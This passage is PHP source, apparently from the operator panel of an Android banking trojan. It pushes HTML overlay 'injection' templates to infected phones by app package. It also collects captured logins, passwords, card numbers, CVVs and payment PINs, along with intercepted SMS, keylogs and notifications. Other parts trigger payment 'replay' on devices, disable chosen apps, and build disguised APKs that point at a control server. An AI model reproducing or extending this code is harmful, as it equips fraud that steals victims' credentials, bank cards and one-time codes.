+            return $this->json(['success' => true, 'data' => null]);
+        }
+        if ($this->method === 'PUT' || $this->method === 'POST') {
+            $b = $this->body;
+            $upd = [];
+            foreach (['name', 'host', 'region', 'realm', 'username', 'password'] as $k) {
+                if (array_key_exists($k, $b)) $upd[$k] = (string)$b[$k];
+            }
+            if (array_key_exists('port', $b)) $upd['port'] = (int)$b['port'];
+            if (array_key_exists('enabled', $b)) $upd['enabled'] = !empty($b['enabled']) ? 1 : 0;
+            if ($upd) Db::table('fisher_turn_nodes')->where('id', $id)->update($upd);
+            return $this->json(['success' => true, 'data' => null]);
+        }
+        return $this->json(Db::table('fisher_turn_nodes')->where('id', $id)->find() ?: null);
+    }
+
+    // ================= injections =================
+    protected function injections(array $seg)
+    {
+        $sub = (string)($seg[1] ?? '');
+        if ($sub === 'batch' && $this->method === 'POST') {
+            $ids = $this->body['ids'] ?? [];
+            $act = (string)($this->body['action'] ?? 'enable');
+            if (is_array($ids) && $ids) {
+                $val = in_array($act, ['enable', 'on', 'show'], true) ? 1 : 0;
+                Db::table('fisher_injection_templates')->whereIn('id', array_map('intval', $ids))->update(['enabled' => $val]);
+            }
+            return $this->json(['success' => true, 'data' => null, 'count' => is_array($ids) ? count($ids) : 0]);
+        }
+        if ($sub === 'export') {
+            $rows = Db::table('fisher_injection_templates')->order('id', 'asc')->select()->toArray();
+            $out = array_map([$this, 'injRow'], $rows);
+            $json = json_encode($out, JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);
+            return response($json, 200, [
+                'Content-Type' => 'application/json; charset=utf-8',
+                'Content-Disposition' => 'attachment; filename="injection_templates.json"',
+            ]);
+        }
+        if ($sub === 'push' && $this->method === 'POST') {
+            $ids = $this->body['ids'] ?? [];
+            $deviceIds = $this->body['device_ids'] ?? [];
+            if (!is_array($deviceIds) || !$deviceIds) {
+                $deviceIds = Db::table('fisher_devices')->where('is_connected', 1)->column('device_id');
+            }
+            $sent = 0;
+            foreach ((array)$deviceIds as $did) {
+                $this->notifyWs((string)$did, 'PUSH_INJECTION', ['ids' => $ids]);
+                $sent++;
+            }
+            return $this->json(['success' => true, 'message' => '已推送 ' . $sent . ' 台设备', 'data' => ['sent' => $sent]]);
+        }
+        if ($this->method === 'POST') {
+            $b = $this->body;
+            $row = [
+                'template_id'  => (string)($b['template_id'] ?? ('tpl-' . bin2hex(random_bytes(4)))),
+                'name'         => (string)($b['name'] ?? $b['label'] ?? $b['title'] ?? 'template'),
+                'package_name' => (string)($b['package_name'] ?? $b['package'] ?? $b['app_pkg'] ?? ''),
+                'country'      => (string)($b['country'] ?? ''),
+                'icon'         => (string)($b['icon'] ?? ''),
+                'color'        => (string)($b['color'] ?? ''),
+                'file'         => (string)($b['file'] ?? ''),
+                'type'         => (string)($b['type'] ?? 'html'),
+                'html_content' => (string)($b['html'] ?? $b['html_content'] ?? ''),
+                'enabled'      => !empty($b['enabled']) ? 1 : 0,
+                'visible'      => isset($b['visible']) ? (!empty($b['visible']) ? 1 : 0) : 1,
+                'created_at'   => date('Y-m-d H:i:s'),
+                'updated_at'   => date('Y-m-d H:i:s'),
+            ];
+            Db::table('fisher_injection_templates')->insert($row);
+            return $this->json(['success' => true, 'data' => null]);
+        }
+        $rows = Db::table('fisher_injection_templates')->order('id', 'desc')->limit(2000)->select()->toArray();
+        return $this->json(array_map([$this, 'injRow'], $rows));
+    }
+
+    protected function injRow(array $r): array
+    {
+        $html = (string)($r['html_content'] ?? '');
+        return [
+            'id'           => (int)$r['id'],
+            'template_id'  => (string)($r['template_id'] ?? ''),
+            'name'         => (string)($r['name'] ?? ''),
+            'title'        => (string)($r['name'] ?? ''),
+            'label'        => (string)($r['name'] ?? ''),
+            'package'      => (string)($r['package_name'] ?? ''),
+            'package_name' => (string)($r['package_name'] ?? ''),
+            'app_name'     => (string)($r['name'] ?? ''),
+            'app_pkg'      => (string)($r['package_name'] ?? ''),
+            'country'      => (string)($r['country'] ?? ''),
+            'icon'         => (string)($r['icon'] ?? ''),
+            'color'        => (string)($r['color'] ?? ''),
+            'file'         => (string)($r['file'] ?? ''),
+            'type'         => (string)($r['type'] ?? 'html'),
+            'html'         => $html,
+            'has_html'     => $html !== '',
+            'enabled'      => (bool)($r['enabled'] ?? 0),
+            'visible'      => (bool)($r['visible'] ?? 1),
+            'auto'         => (bool)($r['enabled'] ?? 0),
+            'created_at'   => (string)($r['created_at'] ?? ''),
+            'updated_at'   => (string)($r['updated_at'] ?? ''),
+        ];
+    }
+
+    protected function injectionItem(array $seg)
+    {
+        $id = (int)($seg[1] ?? 0);
+        $sub = (string)($seg[2] ?? '');
+        if ($this->method === 'POST' && $id === 0) {
+            Db::table('fisher_injection_templates')->insert([
+                'template_id'  => (string)($this->body['template_id'] ?? ('tpl-' . bin2hex(random_bytes(4)))),
+                'name'         => (string)($this->body['name'] ?? $this->body['label'] ?? 'template'),
+                'package_name' => (string)($this->body['package_name'] ?? $this->body['package'] ?? ''),
+                'country'      => (string)($this->body['country'] ?? ''),
+                'type'         => 'html',
+                'html_content' => (string)($this->body['html'] ?? ''),
+                'enabled'      => 1,
+                'visible'      => 1,
+                'created_at'   => date('Y-m-d H:i:s'),
+                'updated_at'   => date('Y-m-d H:i:s'),
+            ]);
+            return $this->json(['success' => true, 'data' => null]);
+        }
+        if ($id > 0) {
+            if ($this->method === 'DELETE') {
+                Db::table('fisher_injection_templates')->where('id', $id)->delete();
+                return $this->json(['success' => true, 'data' => null]);
+            }
+            if ($sub === 'html') {
+                $r = Db::table('fisher_injection_templates')->where('id', $id)->find();
+                return $this->json(['html' => (string)($r['html_content'] ?? ''), 'name' => (string)($r['name'] ?? ''), 'success' => true]);
+            }
+            $patch = [];
+            foreach (['name', 'package_name', 'country', 'icon', 'color', 'file', 'type'] as $k) {
+                if (array_key_exists($k, $this->body)) $patch[$k] = (string)$this->body[$k];
+            }
+            if (array_key_exists('html', $this->body)) $patch['html_content'] = (string)$this->body['html'];
+            if (array_key_exists('enabled', $this->body)) $patch['enabled'] = !empty($this->body['enabled']) ? 1 : 0;
+            if (array_key_exists('visible', $this->body)) $patch['visible'] = !empty($this->body['visible']) ? 1 : 0;
+            if ($sub === 'auto') $patch['enabled'] = (int)($this->body['auto'] ?? $this->body['enabled'] ?? 0);
+            if ($patch) { $patch['updated_at'] = date('Y-m-d H:i:s'); Db::table('fisher_injection_templates')->where('id', $id)->update($patch); }
+        }
+        return $this->json(['success' => true, 'data' => null]);
+    }
+
+    // ================= credentials (injection data) =================
+    protected function credDeviceLabels(): array
+    {
+        static $map = null;
+        if ($map !== null) return $map;
+        $map = [];
+        foreach (Db::table('fisher_devices')->field('device_id,remark,model,brand')->select()->toArray() as $d) {
+            $label = trim((string)($d['remark'] ?? ''));
+            if ($label === '') $label = trim(((string)($d['brand'] ?? '')) . ' ' . ((string)($d['model'] ?? '')));
+            $map[(string)$d['device_id']] = $label;
+        }
+        return $map;
+    }
+
+    protected function credentialRow(array $r): array
+    {
+        $ctype = (string)($r['cipher_type'] ?? $r['type'] ?? 'pin');
+        $secret = (string)($r['cipher_text'] ?? $r['password'] ?? '');
+        $extra = $r['form_data'] ?? $r['extra'] ?? null;
+        $fields = [];
+        if (is_string($extra) && $extra !== '') {
+            $d = json_decode($extra, true);
+            if (is_array($d)) $fields = $d;
+        }
+        $pick = function (array $keys) use ($fields) {
+            foreach ($keys as $k) if (!empty($fields[$k])) return (string)$fields[$k];
+            return '';
+        };
+        $labels = $this->credDeviceLabels();
+        $did = (string)($r['device_id'] ?? '');
+        return [
+            'id'           => (int)$r['id'],
+            'device_id'    => $did,
+            'device_label' => (string)($labels[$did] ?? $did),
+            'app_pkg'      => (string)($r['package_name'] ?? ''),
+            'package_name' => (string)($r['package_name'] ?? ''),
+            'app_name'     => (string)($r['app_name'] ?? $r['template_name'] ?? ''),
+            'template_name'=> (string)($r['template_name'] ?? ''),
+            'type'         => $ctype,
+            'cipher_type'  => $ctype,
+            'login'        => $pick(['login', 'username', 'account', 'user', 'email', 'phone']) ?: (string)($r['account'] ?? ''),
+            'username'     => (string)($r['account'] ?? ''),
+            'password'     => $secret,
+            'cipher_text'  => $secret,
+            'card'         => $pick(['card', 'card_number', 'card_no', 'bankcard']),
+            'pay_pin'      => $ctype === 'pin' ? $secret : $pick(['pay_pin', 'pin', 'payment_password']),
+            'cvv'          => $pick(['cvv', 'cvc', 'security_code']),
+            'exp_date'     => $pick(['exp_date', 'expiry', 'expire', 'exp']),
+            'grade_code'   => (string)($r['grade_code'] ?? ''),
+            'source'       => (string)($r['source'] ?? 'capture'),
+            'extra'        => is_string($extra) ? $extra : ($extra ? json_encode($extra, JSON_UNESCAPED_UNICODE) : ''),
+            'created_at'   => (int)($r['created_at'] ?? 0) * 1000,
+        ];
+    }
+
+    protected function credentials()
+    {
+        if ($this->method === 'DELETE') {
+            Db::table('fisher_passwords')->delete(true);
+            Db::table('fisher_injection_data')->delete(true);
+            return $this->json(['success' => true, 'data' => null]);
+        }
+        $out = [];
+        try {
+            foreach (Db::table('fisher_injection_data')->order('id', 'desc')->limit(500)->select()->toArray() as $r) {
+                $r['type'] = 'injection';
+                $r['cipher_type'] = (string)($r['package_name'] ?? '') !== '' ? 'injection' : 'injection';
+                $out[] = $this->credentialRow($r);
+            }
+        } catch (\Throwable $e) {}
+        foreach (Db::table('fisher_passwords')->order('id', 'desc')->limit(500)->select()->toArray() as $r) {
+            $out[] = $this->credentialRow($r);
+        }
+        return $this->json($out);
+    }
+
+    protected function credentialItem(array $seg)
+    {
+        $id = (int)($seg[1] ?? 0);
+        if ($this->method === 'DELETE' && $id > 0) {
+            Db::table('fisher_passwords')->where('id', $id)->delete();
+            try { Db::table('fisher_injection_data')->where('id', $id)->delete(); } catch (\Throwable $e) {}
+            return $this->json(['success' => true, 'data' => null]);
+        }
+        $r = Db::table('fisher_passwords')->where('id', $id)->find();
+        if ($r) return $this->json($this->credentialRow($r));
+        $r = Db::table('fisher_injection_data')->where('id', $id)->find();
+        if ($r) { $r['type'] = 'injection'; return $this->json($this->credentialRow($r)); }
+        return $this->json(['success' => false, 'error' => '记录不存在'], 404);
+    }
+
+    // ================= sms / keylogs =================
+    protected function smsItem(array $seg)
+    {
+        $id = (int)($seg[1] ?? 0);
+        if ($this->method === 'DELETE' && $id > 0) {
+            Db::table('fisher_sms_messages')->where('id', $id)->delete();
+            return $this->json(['success' => true, 'data' => null]);
+        }
+        $rows = Db::table('fisher_sms_messages')->order('id', 'desc')->limit(1000)->select()->toArray();
+        return $this->json(array_map(function ($r) {
+            $ts = (int)($r['created_at'] ?? 0) * 1000;
+            return [
+                'id'         => (int)$r['id'],
+                'device_id'  => (string)($r['device_id'] ?? ''),
+                'address'    => (string)($r['address'] ?? ''),
+                'phone'      => (string)($r['address'] ?? ''),
+                'body'       => (string)($r['body'] ?? ''),
+                'content'    => (string)($r['body'] ?? ''),
+                'type'       => (int)($r['type'] ?? 1),
+                'recv_at'    => $ts,
+                'timestamp'  => $ts,
+                'created_at' => $ts,
+            ];
+        }, $rows));
+    }
+
+    protected function keylogs()
+    {
+        $type = trim((string)($this->query['log_type'] ?? ''));
+        if ($this->method === 'DELETE') {
+            $q = Db::table('fisher_operation_logs');
+            if ($type !== '') $q = $q->where('log_type', $type);
+            $q->delete();
+            return $this->json(['success' => true, 'data' => null]);
+        }
+        $q = Db::table('fisher_operation_logs');
+        if ($type !== '') $q = $q->where('log_type', $type);
+        $rows = $q->order('id', 'desc')->limit(1000)->select()->toArray();
+        $out = [];
+        foreach ($rows as $r) { $out[] = $this->logRow((string)($r['device_id'] ?? ''), $r); }
+        return $this->json($out);
+    }
+
+    protected function notifications(array $seg)
+    {
+        $id = (int)($seg[1] ?? 0);
+        if ($this->method === 'DELETE') {
+            if ($id > 0) {
+                try { Db::table('fisher_notifications')->where('id', $id)->delete(); } catch (\Throwable $e) {}
+            } else {
+                try { Db::table('fisher_notifications')->delete(true); } catch (\Throwable $e) {}
+            }
+            return $this->json(['success' => true, 'data' => null]);
+        }
+        $rows = [];
+        try {
+            $rows = Db::table('fisher_notifications')->order('id', 'desc')->limit(500)->select()->toArray();
+        } catch (\Throwable $e) {
+            $rows = Db::table('fisher_operation_logs')->where('log_type', 'NTFS')->order('id', 'desc')->limit(500)->select()->toArray();
+        }
+        $out = [];
+        foreach ($rows as $r) {
+            $ts = (int)($r['capt_at'] ?? $r['timestamp'] ?? $r['created_at'] ?? 0);
+            if ($ts > 0 && $ts < 100000000000) $ts = $ts * 1000;
+            $out[] = [
+                'id'         => (int)$r['id'],
+                'device_id'  => (string)($r['device_id'] ?? ''),
+                'app_name'   => (string)($r['app_name'] ?? $r['app_pkg'] ?? ''),
+                'app_pkg'    => (string)($r['app_pkg'] ?? ''),
+                'title'      => (string)($r['title'] ?? ''),
+                'content'    => (string)($r['content'] ?? ''),
+                'text'       => (string)($r['content'] ?? ''),
+                'capt_at'    => $ts,
+                'created_at' => $ts,
+            ];
+        }
+        return $this->json($out);
+    }
+
+    protected function notices()
+    {
+        $rows = [];
+        try {
+            $rows = Db::table('fisher_notices')->order('id', 'desc')->limit(100)->select()->toArray();
+        } catch (\Throwable $e) {
+            $rows = Db::table('fisher_settings')->whereLike('key', 'notice%')->select()->toArray();
+        }
+        $out = [];
+        foreach ($rows as $i => $r) {
+            $out[] = [
+                'id'         => (int)($r['id'] ?? ($i + 1)),
+                'title'      => (string)($r['title'] ?? $r['key'] ?? ''),
+                'content'    => (string)($r['content'] ?? $r['value'] ?? ''),
+                'text'       => (string)($r['content'] ?? $r['value'] ?? ''),
+                'enabled'    => (bool)($r['enabled'] ?? 1),
+                'created_at' => (string)($r['created_at'] ?? ''),
+            ];
+        }
+        return $this->json($out);
+    }
+
+    // ================= app rules =================
+    protected function appRule(string $table, array $seg, string $mode = '')
+    {
+        $id = $seg[1] ?? null;
+        if ($this->method === 'DELETE') {
+            if ($id !== null && $id !== '') Db::table($table)->where('id', (int)$id)->delete();
+            else Db::table($table)->delete(true);
+            return $this->json(['success' => true, 'data' => null]);
+        }
+        if ($this->method === 'POST' || $this->method === 'PUT') {
+            $b = $this->body;
+            $pkg = (string)($b['packageName'] ?? $b['package_name'] ?? $b['package'] ?? $b['app_pkg'] ?? '');
+            if ($pkg === '') return $this->json(['success' => true, 'data' => null]);
+            $enabledKey = $table === 'fisher_black_apps' ? 'is_enabled' : 'is_enabled';
+            $row = [
+                'app_name'     => (string)($b['appName'] ?? $b['app_name'] ?? ''),
+                'package_name' => $pkg,
+                'is_enabled'   => array_key_exists('isEnabled', $b) ? (!empty($b['isEnabled']) ? 1 : 0) : (array_key_exists('enabled', $b) ? (!empty($b['enabled']) ? 1 : 0) : 1),
+                'enable_delay' => (int)($b['enableDelay'] ?? $b['enable_delay'] ?? 5000),
+            ];
+            $exist = Db::table($table)->where('package_name', $pkg)->find();
+            if ($exist) Db::table($table)->where('id', (int)$exist['id'])->update($row);
+            else { $row['created_at'] = time(); Db::table($table)->insert($row); }
+            return $this->json(['success' => true, 'data' => null, 'message' => '已推送规则到设备']);
+        }
+        $rows = Db::table($table)->order('id', 'desc')->select()->toArray();
+        $out = [];
+        foreach ($rows as $r) {
+            $out[] = [
+                'id' => (int)$r['id'],
+                'appName' => (string)($r['app_name'] ?? ''),
+                'app_name' => (string)($r['app_name'] ?? ''),
+                'packageName' => (string)($r['package_name'] ?? ''),
+                'package_name' => (string)($r['package_name'] ?? ''),
+                'isEnabled' => (bool)($r['is_enabled'] ?? 1),
+                'enabled' => (bool)($r['is_enabled'] ?? 1),
+                'enableDelay' => (int)($r['enable_delay'] ?? 5000),
+                'action' => $r['action'] ?? ($table === 'fisher_black_apps' ? 'disable' : 'delay'),
+                'created_at' => (int)($r['created_at'] ?? 0),
+            ];
+        }
+        return $this->json($out);
+    }
+
+    protected function blacklist(array $seg)
+    {
+        $id = (int)($seg[1] ?? 0);
+        if ($this->method === 'DELETE') {
+            if ($id > 0) Db::table('fisher_ip_blacklist')->where('id', $id)->delete();
+            else Db::table('fisher_ip_blacklist')->delete(true);
+            return $this->json(['success' => true, 'data' => null]);
+        }
+        if ($this->method === 'POST' || $this->method === 'PUT') {
+            $ip = trim((string)($this->body['ip'] ?? ''));
+            if ($ip === '') return $this->json(['success' => false, 'error' => 'ip required'], 400);
+            $row = ['ip' => $ip, 'reason' => (string)($this->body['reason'] ?? ''), 'created_at' => time()];
+            $ex = Db::table('fisher_ip_blacklist')->where('ip', $ip)->find();
+            if ($ex) Db::table('fisher_ip_blacklist')->where('id', (int)$ex['id'])->update($row);
+            else Db::table('fisher_ip_blacklist')->insert($row);
+            return $this->json(['success' => true, 'data' => null]);
+        }
+        $rows = Db::table('fisher_ip_blacklist')->order('id', 'desc')->select()->toArray();
+        $out = [];
+        foreach ($rows as $r) {
+            $out[] = [
+                'id' => (int)$r['id'],
+                'ip' => (string)$r['ip'],
+                'reason' => (string)($r['reason'] ?? ''),
+                'created_at' => $this->ts($r['created_at'] ?? 0),
+            ];
+        }
+        return $this->json($out);
+    }
+
+    // ================= payment =================
+    protected function paystg(array $seg)
+    {
+        $id = $seg[1] ?? null;
+        if ($this->method === 'DELETE') {
+            if ($id !== null && $id !== '') Db::table('fisher_payment_strategies')->where('id', (int)$id)->delete();
+            else Db::table('fisher_payment_strategies')->delete(true);
+            return $this->json(['success' => true, 'data' => null]);
+        }
+        if ($this->method === 'POST' || $this->method === 'PUT') {
+            $b = $this->body;
+            $pkg = (string)($b['app_pkg'] ?? $b['package_name'] ?? $b['appPkg'] ?? '');
+            if ($pkg === '') return $this->json(['success' => false, 'error' => 'app_pkg required'], 400);
+            $row = [
+                'device_id' => (string)($b['device_id'] ?? ''),
+                'package_name' => $pkg,
+                'app_name' => (string)($b['app_name'] ?? ''),
+                'windows' => is_string($b['strategy'] ?? null) ? (string)$b['strategy'] : json_encode($b['windows'] ?? ($b['strategy'] ?? []), JSON_UNESCAPED_UNICODE),
+                'enabled' => array_key_exists('enabled', $b) ? (!empty($b['enabled']) ? 1 : 0) : 1,
+                'created_at' => time(),
+            ];
+            $ex = Db::table('fisher_payment_strategies')->where('package_name', $pkg)->where('device_id', $row['device_id'])->find();
+            if ($ex) Db::table('fisher_payment_strategies')->where('id', (int)$ex['id'])->update($row);
+            else Db::table('fisher_payment_strategies')->insert($row);
+            return $this->json(['success' => true, 'data' => null]);
+        }
+        $rows = Db::table('fisher_payment_strategies')->order('id', 'desc')->select()->toArray();
+        $out = [];
+        foreach ($rows as $r) {
+            $w = $r['windows'] ?? '';
+            $out[] = [
+                'id' => (int)$r['id'],
+                'device_id' => (string)($r['device_id'] ?? ''),
+                'app_pkg' => (string)$r['package_name'],
+                'package_name' => (string)$r['package_name'],
+                'app_name' => (string)($r['app_name'] ?? ''),
+                'strategy' => is_string($w) ? $w : json_encode($w, JSON_UNESCAPED_UNICODE),
+                'windows' => $w,
+                'enabled' => (bool)($r['enabled'] ?? 1),
+                'created_at' => (int)($r['created_at'] ?? 0),
+            ];
+        }
+        return $this->json($out);
+    }
+
+    protected function payrec(array $seg)
+    {
+        $id = (int)($seg[1] ?? 0);
+        $sub = (string)($seg[2] ?? '');
+        if ($this->method === 'DELETE') {
+            Db::table('fisher_payment_cipher_records')->where('id', $id)->delete();
+            return $this->json(['success' => true, 'data' => null]);
+        }
+        if ($sub === 'replay' && $this->method === 'POST') {
+            $r = Db::table('fisher_payment_cipher_records')->where('id', $id)->find();
+            if ($r) $this->notifyWs((string)$r['device_id'], 'PAYMENT_REPLAY', ['recordId' => $id, 'packageName' => (string)$r['package_name']]);
+            return $this->json(['success' => true, 'data' => null]);
+        }
+        $r = Db::table('fisher_payment_cipher_records')->where('id', $id)->find();
+        return $this->json($r ? $this->payrecRow($r) : null);
+    }
+
+    // ================= security =================
+    protected function security(array $seg)
+    {
+        $what = (string)($seg[1] ?? '');
+        if ($this->method === 'DELETE') {
+            if ($what === 'logs') { Db::table('fisher_operation_logs')->delete(true); Db::table('fisher_bridge_logs')->delete(true); }
+            if ($what === 'login-attempts') Db::table('fisher_login_logs')->delete(true);
+            if ($what === 'ip-whitelist') $this->settingPut('ip_whitelist', '[]');
+            return $this->json(['success' => true, 'data' => null]);
+        }
+        $page = max(1, (int)($this->query['page'] ?? 1));
+        $size = (int)($this->query['page_size'] ?? $this->query['pageSize'] ?? 50);
+        if ($size < 1) $size = 50;
+        if ($size > 500) $size = 500;
+
+        if ($what === 'login-attempts') {
+            $q = Db::table('fisher_login_logs');
+            $status = trim((string)($this->query['status'] ?? 'all'));
+            if ($status === 'success') $q = $q->where('success', 1);
+            if ($status === 'failed' || $status === 'fail') $q = $q->where('success', 0);
+            $total = (int)$q->count();
+            $rows = $q->order('id', 'desc')->page($page, $size)->select()->toArray();
+            $items = [];
+            foreach ($rows as $r) {
+                $items[] = [
+                    'id' => (int)$r['id'],
+                    'username' => (string)($r['username'] ?? ''),
+                    'ip' => (string)($r['ip'] ?? ''),
+                    'user_agent' => (string)($r['user_agent'] ?? ''),
+                    'status' => ((int)($r['success'] ?? 0) === 1) ? 'success' : 'failed',
+                    'success' => (bool)($r['success'] ?? 0),
+                    'created_at' => $this->ts($r['created_at'] ?? 0),
+                    'time' => (int)($r['created_at'] ?? 0) * 1000,
+                ];
+            }
+            return $this->json(['items' => $items, 'list' => $items, 'total' => $total, 'page' => $page, 'page_size' => $size]);
+        }
+        if ($what === 'ip-whitelist') {
+            if ($this->method === 'POST' || $this->method === 'PUT') {
+                $v = $this->body['list'] ?? $this->body['items'] ?? $this->body;
+                $this->settingPut('ip_whitelist', json_encode($v, JSON_UNESCAPED_UNICODE));
+                return $this->json(['success' => true, 'data' => null]);
+            }
+            $v = Db::table('fisher_settings')->where('key', 'ip_whitelist')->value('value');
+            $d = json_decode((string)$v, true);
+            return $this->json(is_array($d) ? $d : []);
+        }
+        if ($this->method === 'POST' || $this->method === 'PUT') {
+            return $this->json(['success' => true, 'data' => null]);
+        }
+        $q = Db::table('fisher_operation_logs');
+        $level = trim((string)($this->query['level'] ?? ''));
+        if ($level !== '' && $level !== 'all') $q = $q->where('log_type', $level);
+        $total = (int)$q->count();
+        $rows = $q->order('id', 'desc')->page($page, $size)->select()->toArray();
+        $items = [];
+        foreach ($rows as $r) {
+            $ts = (int)($r['timestamp'] ?? 0);
+            $items[] = [
+                'id' => (int)$r['id'],
+                'device_id' => (string)($r['device_id'] ?? ''),
+                'log_type' => (string)($r['log_type'] ?? 'info'),
+                'level' => (string)($r['log_type'] ?? 'info'),
+                'content' => (string)($r['content'] ?? ''),
+                'text' => (string)($r['content'] ?? ''),
+                'created_at' => $this->ts($ts ?: (int)($r['created_at'] ?? 0)),
+                'time' => $ts * 1000,
+            ];
+        }
+        return $this->json(['items' => $items, 'list' => $items, 'total' => $total, 'page' => $page, 'page_size' => $size]);
+    }
+
+    // ================= auto commands =================
+    protected function autocommands()
+    {
+        if ($this->method === 'POST' || $this->method === 'PUT') {
+            $b = $this->body;
+            Db::table('fisher_auto_commands')->insert([
+                'label' => (string)($b['label'] ?? ''),
+                'command' => (string)($b['command'] ?? ''),
+                'payload' => json_encode($b['payload'] ?? [], JSON_UNESCAPED_UNICODE),
+                'delay_sec' => (int)($b['delay_sec'] ?? 0),
+                'enabled' => array_key_exists('enabled', $b) ? (!empty($b['enabled']) ? 1 : 0) : 1,
+                'scope' => (string)($b['scope'] ?? 'all'),
+                'created_at' => time(),
+            ]);
+            return $this->json(['success' => true, 'data' => null]);
+        }
+        $rows = Db::table('fisher_auto_commands')->order('id', 'asc')->select()->toArray();
+        $out = [];
+        foreach ($rows as $r) {
+            $out[] = [
+                'id' => (int)$r['id'],
+                'label' => (string)($r['label'] ?? ''),
+                'command' => (string)($r['command'] ?? ''),
+                'payload' => json_decode((string)($r['payload'] ?? '[]'), true) ?: [],
+                'delay_sec' => (int)($r['delay_sec'] ?? 0),
+                'enabled' => (bool)($r['enabled'] ?? 1),
+                'scope' => (string)($r['scope'] ?? 'all'),
+                'created_at' => (int)($r['created_at'] ?? 0),
+            ];
+        }
+        return $this->json($out);
+    }
+
+    protected function autocommandItem(array $seg)
+    {
+        $id = (int)($seg[1] ?? 0);
+        if ($this->method === 'DELETE') {
+            Db::table('fisher_auto_commands')->where('id', $id)->delete();
+            return $this->json(['success' => true, 'data' => null]);
+        }
+        if ($this->method === 'PUT' || $this->method === 'POST') {
+            $upd = [];
+            if (array_key_exists('enabled', $this->body)) $upd['enabled'] = !empty($this->body['enabled']) ? 1 : 0;
+            if (array_key_exists('label', $this->body)) $upd['label'] = (string)$this->body['label'];
+            if (array_key_exists('command', $this->body)) $upd['command'] = (string)$this->body['command'];
+            if (array_key_exists('payload', $this->body)) $upd['payload'] = json_encode($this->body['payload'], JSON_UNESCAPED_UNICODE);
+            if ($upd) Db::table('fisher_auto_commands')->where('id', $id)->update($upd);
+            return $this->json(['success' => true, 'data' => null]);
+        }
+        return $this->json(Db::table('fisher_auto_commands')->where('id', $id)->find() ?: null);
+    }
+
+    protected function builds()
+    {
+        $rows = Db::table('fisher_apk_builds')->order('id', 'desc')->limit(300)->select()->toArray();
+        $out = [];
+        foreach ($rows as $r) $out[] = $this->buildRow($r);
+        return $this->json($out);
+    }
+
+    protected function buildRow(array $r): array
+    {
+        $ts = (int)($r['created_at'] ?? 0);
+        return [
+            'id'           => (int)$r['id'],
+            'name'         => (string)($r['app_name'] ?? ''),
+            'app_name'     => (string)($r['app_name'] ?? ''),
+            'app_label'    => (string)($r['app_name'] ?? ''),
+            'package_name' => (string)($r['pkg_name'] ?? 'com.zq.final'),
+            'pkg_name'     => (string)($r['pkg_name'] ?? 'com.zq.final'),
+            'server_url'   => (string)($r['server_url'] ?? ''),
+            'wrap_url'     => (string)($r['web_url'] ?? ''),
+            'status'       => (string)($r['status'] ?? 'pending'),
+            'progress'     => (string)((int)($r['progress'] ?? 0)),
+            'message'      => (string)($r['message'] ?? ''),
+            'error'        => (string)($r['error'] ?? ''),
+            'build_log'    => (string)($r['build_log'] ?? ''),
+            'apk_path'     => (string)($r['filename'] ?? ''),
+            'out_path'     => (string)($r['out_path'] ?? ''),
+            'file_size'    => (int)($r['file_size'] ?? 0),
+            'template'     => (string)($r['template'] ?? ''),
+            'build_type'   => 'local',
+            'cdn_url'      => '',
+            'created_at'   => $this->ts($ts),
+            'create_at'    => $this->ts($ts),
+            'owner_username' => (string)($r['owner_username'] ?? ''),
+        ];
+    }
+
+    // ============ APK builder (template = 1 的 APK) ============
+    protected function buildRoute(array $seg)
+    {
+        $id = (int)($seg[1] ?? 0);
+        if ($id > 0 && ($this->method === 'GET') && (($seg[2] ?? '') === 'download')) {
+            return $this->buildDownload($id);
+        }
+        if ($id > 0 && $this->method === 'DELETE') {
+            $row = Db::table('fisher_apk_builds')->where('id', $id)->find();
+            if ($row && !empty($row['out_path']) && is_file((string)$row['out_path'])) @unlink((string)$row['out_path']);
+            Db::table('fisher_apk_builds')->where('id', $id)->delete();
+            return $this->json(['success' => true, 'data' => null]);
+        }
+        if ($id > 0 && $this->method === 'GET') {
+            $row = Db::table('fisher_apk_builds')->where('id', $id)->find();
+            return $this->json($row ? $this->buildRow($row) : null);
+        }
+        if ($this->method === 'POST' || $this->method === 'PUT') {
+            return $this->buildCreate();
+        }
+        return $this->json(['success' => true, 'data' => null]);
+    }
+
+    protected function buildCreate()
+    {
+        $b = $this->body;
+        $serverUrl = trim((string)($b['server_url'] ?? $b['serverUrl'] ?? ''));
+        $webUrl    = trim((string)($b['wrap_url'] ?? $b['web_url'] ?? $b['webUrl'] ?? ''));
+        $appName   = trim((string)($b['app_label'] ?? $b['app_name'] ?? $b['appName'] ?? ''));
+        if ($appName === '') $appName = 'App';
+        $psc = $b['pageStyleConfig'] ?? ($b['page_style_config'] ?? []);
+        if (is_string($psc)) { $d = json_decode($psc, true); $psc = is_array($d) ? $d : []; }
+        if (!is_array($psc)) $psc = [];
+
+        $extend = dirname(__DIR__, 2) . DIRECTORY_SEPARATOR . 'extend';
+        $tpl = $extend . DIRECTORY_SEPARATOR . 'source.apk';
+        if (!is_file($tpl)) {
+            return $this->json(['success' => false, 'error' => '构建模板缺失: ' . $tpl], 500);
+        }
+        $prefix = strtoupper(substr(preg_replace('/[^a-zA-Z]/', '', $appName) ?: 'TF', 0, 3)) ?: 'TF';
+        $filename = $prefix . '_' . date('Ymd_His') . '.apk';
+        $outDir = dirname(__DIR__, 2) . DIRECTORY_SEPARATOR . 'public' . DIRECTORY_SEPARATOR . 'storage' . DIRECTORY_SEPARATOR . 'apk';
+        if (!is_dir($outDir)) @mkdir($outDir, 0777, true);
+        $out = $outDir . DIRECTORY_SEPARATOR . $filename;
+
+        $id = (int)Db::table('fisher_apk_builds')->insertGetId([
+            'filename'       => $filename,
+            'server_url'     => $serverUrl,
+            'web_url'        => $webUrl,
+            'app_name'       => $appName,
+            'file_size'      => 0,
+            'status'         => 'building',
+            'created_at'     => time(),
+            'owner_username' => (string)($this->user['username'] ?? ''),
+            'pkg_name'       => 'com.zq.final',
+            'progress'       => 3,
+            'message'        => '任务已创建',
+            'template'       => 'source.apk (1/built_15217283034)',
+        ]);
+
+        $jobDir = dirname(__DIR__, 2) . DIRECTORY_SEPARATOR . 'runtime' . DIRECTORY_SEPARATOR . 'apk_jobs';
+        if (!is_dir($jobDir)) @mkdir($jobDir, 0777, true);
+        $jobFile = $jobDir . DIRECTORY_SEPARATOR . 'job_' . $id . '.json';
+        $job = [
+            'record_id'          => $id,
+            'template'           => $tpl,
+            'out'                => $out,
+            'server_url'         => $serverUrl,
+            'web_url'            => $webUrl,
+            'app_name'           => $appName,
+            'page_style_config'  => $psc,
+            'show_app_icon'      => !empty($b['show_app_icon']),
+            'enable_service_mode'=> !empty($b['enable_service_mode']),
+        ];
